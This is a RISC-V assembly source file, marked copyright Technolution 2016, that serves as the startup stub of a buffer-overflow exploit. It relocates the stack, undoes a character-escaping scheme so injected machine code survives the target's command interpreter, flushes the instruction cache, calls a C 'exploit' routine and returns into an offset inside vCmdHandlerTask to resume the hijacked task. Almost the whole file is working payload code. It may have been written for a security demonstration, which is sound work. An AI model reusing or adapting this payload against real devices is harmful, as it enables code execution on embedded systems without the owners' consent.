/*
  (C) COPYRIGHT 2016 TECHNOLUTION B.V., GOUDA NL
  =======          I                   ==          I    =
     I             I                    I          I
|    I   ===   === I ===  I ===   ===   I  I    I ====  I   ===  I ===
|    I  /   \ I    I/   I I/   I I   I  I  I    I  I    I  I   I I/   I
|    I  ===== I    I    I I    I I   I  I  I    I  I    I  I   I I    I
|    I  \     I    I    I I    I I   I  I  I   /I  \    I  I   I I    I
|    I   ===   === I    I I    I  ===  ===  === I   ==  I   ===  I    I
|                 +---------------------------------------------------+
+----+            |  +++++++++++++++++++++++++++++++++++++++++++++++++|
     |            |             ++++++++++++++++++++++++++++++++++++++|
     +------------+                          +++++++++++++++++++++++++|
                                                        ++++++++++++++|
                                                                 +++++|
 */
#ifdef __riscv64
# define STORE    sd
# define LOAD     ld
# define REGBYTES 8
#else
# define STORE    sw
# define LOAD     lw
# define REGBYTES 4
#endif

//#define SHOW_DUMP_AFTER_ESCAPE

    .section .text,"ax"
    .global start
    .global fe_end
/* Startup code */
start:
    addi    sp,sp,-512  // get the stack pointer to below our buffer, to ensure any call won't overwrite our code

/***************************************
 * fix excaping
 * The loaded code in the buffer overflow is excaped for special characters
 * have a special handling by the command interpreter on the target. The
 * escaping ensures that the command handler won't change our binary because
 * of its interpretation of the received characters.
 *
 * NOTE: the code below may not contain these special characters as it needs
 *       to execute before it can be escaped!! We use fixed values where
 *       possible! So is for example __expoit_end not used, but a fixed value.
 *
 * t0 = source address pointer
 * t1 = target address pointer
 * t2 = end address pointer
 * t3 = don't use t3 as it causes an 'special' character to be generated in the binary
 * t4 = just a temp register
 * t5 = value
 */
fix_excaping:
    la      t0, __exploit_start
    la      t1, __exploit_start
    la      t2, __exploit_start + 256   // we could have use __exploit_end here, but we shouldn't (see above)
fe_loop:
    lb      t5, 0(t0)
    addi    t4, t5, -4      // check if character is not 4. If 4 we have an escape
    bnez    t4, fe_store
    addi    t0, t0, 1       // goto next index position to find actual (but modified) value
    lb      t5, 0(t0)       // load value
    addi    t5, t5, -32     // add magic number to get actual value (-32 as 32 is the first readable char)
    addi    t2, t2, 1       // the insert caused our buffer to be larger, so increment the end pointer
fe_store:
    sb      t5, 0(t1)       // store the byte at the destination pointer
    addi    t0, t0, 1       // increment source pointer
    addi    t1, t1, 1       // increment destion pointer
    bne     t0, t2, fe_loop // of not at the end of the buffer then loop
    fence.i                 // ensure the instruction cache is synced
fe_end:


#ifdef SHOW_DUMP_AFTER_ESCAPE
    la      a0, __exploit_start
    li      a1, 386
    la      t0, mdump
    jalr    t0
#endif

    /* execute c routine */
    jal     exploit         // jump and link to the C based expoit code :-)
loop:
#ifndef SHOW_DUMP_AFTER_ESCAPE
    addi    sp,sp,512
    la      ra, vCmdHandlerTask + 0x1C
    ret
#endif
